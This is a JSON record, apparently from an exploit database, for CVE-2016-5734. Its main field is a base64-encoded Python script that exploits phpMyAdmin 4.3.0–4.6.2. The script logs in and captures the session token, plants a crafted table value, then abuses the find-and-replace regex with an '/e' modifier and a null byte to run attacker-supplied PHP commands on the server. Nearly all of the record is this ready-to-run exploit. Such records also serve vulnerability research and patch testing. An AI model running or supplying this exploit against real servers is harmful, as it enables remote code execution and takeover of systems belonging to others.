{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiIiImN2ZS0yMDE2LTU3MzQucHk6IFBocE15QWRtaW4gNC4zLjAgLSA0LjYuMiBhdXRob3JpemVkIHVzZXIgUkNFIGV4cGxvaXQNCkRldGFpbHM6IFdvcmtpbmcgb25seSBhdCBQSFAgNC4zLjAtNS40LjYgdmVyc2lvbnMsIGJlY2F1c2Ugb2YgcmVnZXggYnJlYWsgd2l0aCBudWxsIGJ5dGUgZml4ZWQgaW4gUEhQIDUuNC43Lg0KQ1ZFOiBDVkUtMjAxNi01NzM0DQpBdXRob3I6IGh0dHBzOi8vdHdpdHRlci5jb20vaWFtc2VjdXJpdHkNCnJ1bjogLi9jdmUtMjAxNi01NzM0LnB5IC11IHJvb3QgLS1wd2Q9IiIgaHR0cDovL2xvY2FsaG9zdC9wbWEgLWMgInN5c3RlbSgnbHMgLWx1YScpOyINCiIiIg0KDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBhcmdwYXJzZQ0KaW1wb3J0IHN5cw0KDQpfX2F1dGhvcl9fID0gIkBpYW1zZWN1cml0eSINCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBwYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcigpDQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgidXJsIiwgdHlwZT1zdHIsIGhlbHA9IlVSTCB3aXRoIHBhdGggdG8gUE1BIikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItYyIsICItLWNtZCIsIHR5cGU9c3RyLCBoZWxwPSJQSFAgY29tbWFuZChzKSB0byBldmFsKCkiKQ0KICAgIHBhcnNlci5hZGRfYXJndW1lbnQoIi11IiwgIi0tdXNlciIsIHJlcXVpcmVkPVRydWUsIHR5cGU9c3RyLCBoZWxwPSJWYWxpZCBQTUEgdXNlciIpDQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLXAiLCAiLS1wd2QiLCByZXF1aXJlZD1UcnVlLCB0eXBlPXN0ciwgaGVscD0iUGFzc3dvcmQgZm9yIHZhbGlkIFBNQSB1c2VyIikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItZCIsICItLWRicyIsIHR5cGU9c3RyLCBoZWxwPSJFeGlzdGluZyBkYXRhYmFzZSBhdCBhIHNlcnZlciIpDQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLVQiLCAiLS10YWJsZSIsIHR5cGU9c3RyLCBoZWxwPSJDdXN0b20gdGFibGUgbmFtZSBmb3IgZXhwbG9pdC4iKQ0KICAgIGFyZ3VtZW50cyA9IHBhcnNlci5wYXJzZV9hcmdzKCkNCiAgICB1cmxfdG9fcG1hID0gYXJndW1lbnRzLnVybA0KICAgIHVuYW1lID0gYXJndW1lbnRzLnVzZXINCiAgICB1cGFzcyA9IGFyZ3VtZW50cy5wd2QNCiAgICBpZiBhcmd1bWVudHMuZGJzOg0KICAgICAgICBkYiA9IGFyZ3VtZW50cy5kYnMNCiAgICBlbHNlOg0KICAgICAgICBkYiA9ICJ0ZXN0Ig0KICAgIHRva2VuID0gRmFsc2UNCiAgICBjdXN0b21fdGFibGUgPSBGYWxzZQ0KICAgIGlmIGFyZ3VtZW50cy50YWJsZToNCiAgICAgICAgY3VzdG9tX3RhYmxlID0gVHJ1ZQ0KICAgICAgICB0YWJsZSA9IGFyZ3VtZW50cy50YWJsZQ0KICAgIGVsc2U6DQogICAgICAgIHRhYmxlID0gInByZ3B3biINCiAgICBpZiBhcmd1bWVudHMuY21kOg0KICAgICAgICBwYXlsb2FkID0gYXJndW1lbnRzLmNtZA0KICAgIGVsc2U6DQogICAgICAgIHBheWxvYWQgPSAic3lzdGVtKCd1bmFtZSAtYScpOyINCg0KICAgIHNpemUgPSAzMg0KICAgIHMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAjIHlvdSBjYW4gbWFudWFsbHkgYWRkIHByb3h5IHN1cHBvcnQgaXQncyB2ZXJ5IHNpbXBsZSA7KQ0KICAgICMgcy5wcm94aWVzID0geydodHRwJzogIjEyNy4wLjAuMTo4MDgwIiwgJ2h0dHBzJzogIjEyNy4wLjAuMTo4MDgwIn0NCiAgICBzLnZlcmlmeSA9IEZhbHNlDQogICAgc3FsID0gJycnQ1JFQVRFIFRBQkxFIGB7MH1gICgNCiAgICAgIGBmaXJzdGAgdmFyY2hhcigxMCkgQ0hBUkFDVEVSIFNFVCB1dGY4IE5PVCBOVUxMDQogICAgKSBFTkdJTkU9SW5ub0RCIERFRkFVTFQgQ0hBUlNFVD1sYXRpbjE7DQogICAgSU5TRVJUIElOVE8gYHswfWAgKGBmaXJzdGApIFZBTFVFUyAoVU5IRVgoJzMwMkY2NTAwJykpOw0KICAgICcnJy5mb3JtYXQodGFibGUpDQoNCiAgICAjIGdldF90b2tlbg0KICAgIHJlc3AgPSBzLnBvc3QodXJsX3RvX3BtYSArICIvP2xhbmc9ZW4iLCBkaWN0KA0KICAgICAgICBwbWFfdXNlcm5hbWU9dW5hbWUsDQogICAgICAgIHBtYV9wYXNzd29yZD11cGFzcw0KICAgICkpDQogICAgaWYgcmVzcC5zdGF0dXNfY29kZSBpcyAyMDA6DQogICAgICAgIHRva2VuX3BsYWNlID0gcmVzcC50ZXh0LmZpbmQoInRva2VuPSIpICsgNg0KICAgICAgICB0b2tlbiA9IHJlc3AudGV4dFt0b2tlbl9wbGFjZTp0b2tlbl9wbGFjZSArIDMyXQ0KICAgIGlmIHRva2VuIGlzIEZhbHNlOg0KICAgICAgICBwcmludCgiQ2Fubm90IGdldCB2YWxpZCBhdXRob3JpemF0aW9uIHRva2VuLiIpDQogICAgICAgIHN5cy5leGl0KDEpDQoNCiAgICBpZiBjdXN0b21fdGFibGUgaXMgRmFsc2U6DQogICAgICAgIGRhdGEgPSB7DQogICAgICAgICAgICAiaXNfanNfY29uZmlybWVkIjogIjAiLA0KICAgICAgICAgICAgImRiIjogZGIsDQogICAgICAgICAgICAidG9rZW4iOiB0b2tlbiwNCiAgICAgICAgICAgICJwb3MiOiAiMCIsDQogICAgICAgICAgICAic3FsX3F1ZXJ5Ijogc3FsLA0KICAgICAgICAgICAgInNxbF9kZWxpbWl0ZXIiOiAiOyIsDQogICAgICAgICAgICAic2hvd19xdWVyeSI6ICIwIiwNCiAgICAgICAgICAgICJma19jaGVja3MiOiAiMCIsDQogICAgICAgICAgICAiU1FMIjogIkdvIiwNCiAgICAgICAgICAgICJhamF4X3JlcXVlc3QiOiAidHJ1ZSIsDQogICAgICAgICAgICAiYWpheF9wYWdlX3JlcXVlc3QiOiAidHJ1ZSIsDQogICAgICAgIH0NCiAgICAgICAgcmVzcCA9IHMucG9zdCh1cmxfdG9fcG1hICsgIi9pbXBvcnQucGhwIiwgZGF0YSwgY29va2llcz1yZXF1ZXN0cy51dGlscy5kaWN0X2Zyb21fY29va2llamFyKHMuY29va2llcykpDQogICAgICAgIGlmIHJlc3Auc3RhdHVzX2NvZGUgPT0gMjAwOg0KICAgICAgICAgICAgaWYgInN1Y2Nlc3MiIGluIHJlc3AuanNvbigpOg0KICAgICAgICAgICAgICAgIGlmIHJlc3AuanNvbigpWyJzdWNjZXNzIl0gaXMgRmFsc2U6DQogICAgICAgICAgICAgICAgICAgIGZpcnN0ID0gcmVzcC5qc29uKClbImVycm9yIl1bcmVzcC5qc29uKClbImVycm9yIl0uZmluZCgiPGNvZGU+IikrNjpdDQogICAgICAgICAgICAgICAgICAgIGVycm9yID0gZmlyc3RbOmZpcnN0LmZpbmQoIjwvY29kZT4iKV0NCiAgICAgICAgICAgICAgICAgICAgaWYgImFscmVhZHkgZXhpc3RzIiBpbiBlcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGVycm9yKQ0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkVSUk9SOiAiICsgZXJyb3IpDQogICAgICAgICAgICAgICAgICAgICAgICBzeXMuZXhpdCgxKQ0KICAgICMgYnVpbGQgZXhwbG9pdA0KICAgIGV4cGxvaXQgPSB7DQogICAgICAgICJkYiI6IGRiLA0KICAgICAgICAidGFibGUiOiB0YWJsZSwNCiAgICAgICAgInRva2VuIjogdG9rZW4sDQogICAgICAgICJnb3RvIjogInNxbC5waHAiLA0KICAgICAgICAiZmluZCI6ICIwL2VcMCIsDQogICAgICAgICJyZXBsYWNlV2l0aCI6IHBheWxvYWQsDQogICAgICAgICJjb2x1bW5JbmRleCI6ICIwIiwNCiAgICAgICAgInVzZVJlZ2V4IjogIm9uIiwNCiAgICAgICAgInN1Ym1pdCI6ICJHbyIsDQogICAgICAgICJhamF4X3JlcXVlc3QiOiAidHJ1ZSINCiAgICB9DQogICAgcmVzcCA9IHMucG9zdCgNCiAgICAgICAgdXJsX3RvX3BtYSArICIvdGJsX2ZpbmRfcmVwbGFjZS5waHAiLCBleHBsb2l0LCBjb29raWVzPXJlcXVlc3RzLnV0aWxzLmRpY3RfZnJvbV9jb29raWVqYXIocy5jb29raWVzKQ0KICAgICkNCiAgICBpZiByZXNwLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICAgICAgcmVzdWx0ID0gcmVzcC5qc29uKClbIm1lc3NhZ2UiXVtyZXNwLmpzb24oKVsibWVzc2FnZSJdLmZpbmQoIjwvYT4iKSs4Ol0NCiAgICAgICAgaWYgbGVuKHJlc3VsdCk6DQogICAgICAgICAgICBwcmludCgicmVzdWx0OiAiICsgcmVzdWx0KQ0KICAgICAgICAgICAgc3lzLmV4aXQoMCkNCiAgICAgICAgcHJpbnQoDQogICAgICAgICAgICAiRXhwbG9pdCBmYWlsZWQhXG4iDQogICAgICAgICAgICAiVHJ5IHRvIG1hbnVhbGx5IHNldCBleHBsb2l0IHBhcmFtZXRlcnMgbGlrZSAtLXRhYmxlLCAtLWRhdGFiYXNlIGFuZCAtLXRva2VuLlxuIg0KICAgICAgICAgICAgIlJlbWVtYmVyIHRoYXQgc2VydmVycyB3aXRoIFBIUCB2ZXJzaW9uIGdyZWF0ZXIgdGhhbiA1LjQuNiINCiAgICAgICAgICAgICIgaXMgbm90IGV4cGxvaXRhYmxlLCBiZWNhdXNlIG9mIHdhcm5pbmcgYWJvdXQgbnVsbCBieXRlIGluIHJlZ2V4cCINCiAgICAgICAgKQ0KICAgICAgICBzeXMuZXhpdCgxKQ==", 
    "filename": "platforms/php/webapps/40185.py", 
    "id": "40185", 
    "cves": [
        "CVE-2016-5734"
    ]
}